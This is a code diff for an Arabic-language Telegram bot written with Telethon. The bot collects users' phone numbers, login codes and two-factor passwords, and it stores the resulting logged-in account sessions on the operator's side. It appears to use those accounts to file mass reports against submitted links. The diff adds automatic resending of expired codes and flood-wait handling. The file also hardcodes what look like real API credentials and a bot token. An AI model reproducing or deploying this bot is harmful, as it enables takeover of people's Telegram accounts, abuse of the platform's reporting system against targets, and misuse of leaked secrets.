@@ -1,14 +1,26 @@
 import asyncio
 import re
 import os
+import time
 from telethon import TelegramClient, events, Button
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
-from telethon.tl.types import InputReportReasonSpam, InputReportReasonViolence, InputReportReasonPornography, InputReportReasonOther
+from telethon.errors import (
+    SessionPasswordNeededError, 
+    PhoneCodeInvalidError, 
+    PhoneCodeExpiredError,
+    PhoneNumberInvalidError,
+    FloodWaitError
+)
+from telethon.tl.types import (
+    InputReportReasonSpam, 
+    InputReportReasonViolence, 
+    InputReportReasonPornography, 
+    InputReportReasonOther
+)
 from telethon.tl.functions.messages import ReportRequest
 
-# إعدادات البوت (يجب تعبئتها)
-API_ID = 23656977  # استبدل بـ API ID الخاص بك
-API_HASH = '49d3f43531a92b3f5bc403766313ca1e'  # استبدل بـ API HASH الخاص بك
+# إعدادات البوت
+API_ID = 23656977
+API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
 BOT_TOKEN = '8312137482:AAEORpBnD8CmFfB39ayJT4UputPoSh_qCRw'
 ADMIN_ID = 7251748706
 
@@ -28,6 +40,7 @@ REPORT_TYPES = {
 sessions = {}
 reports = {}
 user_states = {}
+pending_codes = {}
 
 # إنشاء عميل البوت
 bot = TelegramClient('clean_environment_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -36,6 +49,8 @@ bot = TelegramClient('clean_environment_bot', API_ID, API_HASH).start(bot_token=
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     user_id = event.sender_id
+    
+    # إعادة تعيين حالة المستخدم
     user_states[user_id] = PHONE
     
     # إرسال رسالة البدء مع تعليمات واضحة
@@ -74,7 +89,8 @@ async def handle_message(event):
     user_id = event.sender_id
     state = user_states.get(user_id)
     
-    if state is None:
+    # تجاهل الأوامر
+    if event.raw_text.startswith('/'):
         return
     
     if state == PHONE:
@@ -91,16 +107,19 @@ async def handle_phone(event):
     user_id = event.sender_id
     phone = event.raw_text.strip()
     
+    # إذا كانت الرسالة فارغة
+    if not phone:
+        await event.respond("❌ لم تستلم أي رقم. الرجاء إرسال رقم الهاتف:")
+        return
+    
     # تنظيف الرقم
     phone = phone.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
     
-    # محاولة تصحيح الأرقام التي تبدأ بـ "00"
+    # محاولة تصحيح الأرقام
     if phone.startswith("00"):
         phone = "+" + phone[2:]
-    # تصحيح الأرقام التي تبدأ بـ "0" بدون رمز دولة
     elif phone.startswith("0") and not phone.startswith("+"):
         phone = "+" + phone
-    # إضافة + إذا نساها المستخدم
     elif not phone.startswith("+"):
         phone = "+" + phone
     
@@ -118,18 +137,23 @@ async def handle_phone(event):
         return
     
     # إنشاء جلسة جديدة للمستخدم
-    client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
-    await client.connect()
-    
     try:
+        client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
+        await client.connect()
+        
         # إرسال كود التحقق
         sent_code = await client.send_code_request(phone)
+        
+        # تخزين بيانات الجلسة
         sessions[user_id] = {
             'client': client,
             'phone': phone,
-            'phone_code_hash': sent_code.phone_code_hash
+            'phone_code_hash': sent_code.phone_code_hash,
+            'created_at': time.time()
         }
+        
         user_states[user_id] = CODE
+        pending_codes[user_id] = sent_code
         
         # إرسال رسالة توضيحية للكود
         await event.respond(
@@ -137,21 +161,24 @@ async def handle_phone(event):
             "طريقة الاستلام:\n"
             "1. إشعار في تطبيق Telegram\n"
             "2. رسالة SMS (إذا لم يصل الإشعار)\n\n"
-            "الرجاء إدخال الكود المكون من 5 أرقام (مثل: 12345):"
+            "الرجاء إدخال الكود المكون من 5-6 أرقام (مثل: 12345):"
         )
     except PhoneNumberInvalidError:
         await event.respond("❌ رقم الهاتف غير صالح. الرجاء التحقق وإعادة الإدخال:")
+    except FloodWaitError as e:
+        await event.respond(f"⏳ تم تجاوز عدد المحاولات. الرجاء الانتظار {e.seconds} ثانية قبل المحاولة مرة أخرى.")
     except Exception as e:
         await event.respond(f"❌ حدث خطأ: {str(e)}\nالرجاء المحاولة مرة أخرى /start")
-        del user_states[user_id]
+        if user_id in user_states:
+            del user_states[user_id]
 
 # معالجة كود التحقق
 async def handle_code(event):
     user_id = event.sender_id
     code = event.raw_text.strip()
     
-    if not re.match(r"^\d{5,6}$", code):  # قد يكون الكود 5 أو 6 أرقام
-        await event.respond("❌ كود غير صحيح! يجب أن يكون بين 5-6 أرقام. الرجاء إعادة الإدخال:")
+    if not code:
+        await event.respond("❌ لم تستلم أي كود. الرجاء إدخال الكود:")
         return
     
     session = sessions.get(user_id)
@@ -184,12 +211,25 @@ async def handle_code(event):
         )
     except PhoneCodeInvalidError:
         await event.respond("❌ كود التحقق غير صحيح! الرجاء المحاولة مرة أخرى:")
+    except PhoneCodeExpiredError:
+        # إذا انتهت صلاحية الكود، نرسل كود جديد
+        await event.respond("⌛️ كود التحقق منتهي الصلاحية. جاري إرسال كود جديد...")
+        try:
+            sent_code = await session['client'].send_code_request(session['phone'])
+            session['phone_code_hash'] = sent_code.phone_code_hash
+            session['created_at'] = time.time()
+            await event.respond("🔑 تم إرسال كود تحقق جديد. الرجاء إدخال الكود الجديد:")
+        except Exception as e:
+            await event.respond(f"❌ فشل في إرسال كود جديد: {str(e)}\nالرجاء البدء من جديد /start")
+            if user_id in user_states:
+                del user_states[user_id]
     except SessionPasswordNeededError:
         await event.respond("🔒 حسابك محمي بكلمة سر. الرجاء إرسال كلمة السر:")
         user_states[user_id] = 'PASSWORD'
     except Exception as e:
         await event.respond(f"❌ حدث خطأ: {str(e)}\nالرجاء البدء من جديد /start")
-        del user_states[user_id]
+        if user_id in user_states:
+            del user_states[user_id]
 
 # معالجة كلمة السر
 @bot.on(events.NewMessage)
@@ -246,6 +286,10 @@ async def handle_report_link(event):
     user_id = event.sender_id
     link = event.raw_text.strip()
     
+    if not link:
+        await event.respond("❌ لم تستلم أي رابط. الرجاء إرسال الرابط:")
+        return
+    
     # تنظيف الرابط
     if link.startswith("https://"):
         link = link
@@ -280,6 +324,11 @@ async def handle_report_link(event):
 async def handle_report_message(event):
     user_id = event.sender_id
     report_message = event.raw_text
+    
+    if not report_message:
+        await event.respond("❌ لم تستلم أي تفاصيل. الرجاء إرسال تفاصيل البلاغ:")
+        return
+    
     sessions[user_id]['report_message'] = report_message
     user_states[user_id] = CONFIRMATION
     
@@ -418,6 +467,22 @@ async def stop_reporting(event):
     else:
         await event.respond("⚠️ **لا توجد عملية إبلاغ جارية.**")
 
+# وظيفة لتنظيف الجلسات القديمة
+async def clean_old_sessions():
+    while True:
+        await asyncio.sleep(60)  # تنظيف كل دقيقة
+        current_time = time.time()
+        for user_id, session_data in list(sessions.items()):
+            # إذا مرت أكثر من 10 دقائق دون تفعيل
+            if current_time - session_data.get('created_at', 0) > 600:
+                try:
+                    await session_data['client'].disconnect()
+                except:
+                    pass
+                if user_id in sessions: del sessions[user_id]
+                if user_id in user_states: del user_states[user_id]
+                if user_id in reports: del reports[user_id]
+
 # تشغيل البوت
 if __name__ == '__main__':
     # إنشاء مجلد الجلسات إذا لم يكن موجوداً
@@ -425,4 +490,8 @@ if __name__ == '__main__':
         os.makedirs('sessions')
     
     print("جارٍ تشغيل البوت...")
+    
+    # بدء مهمة تنظيف الجلسات
+    bot.loop.create_task(clean_old_sessions())
+    
     bot.run_until_disconnected()
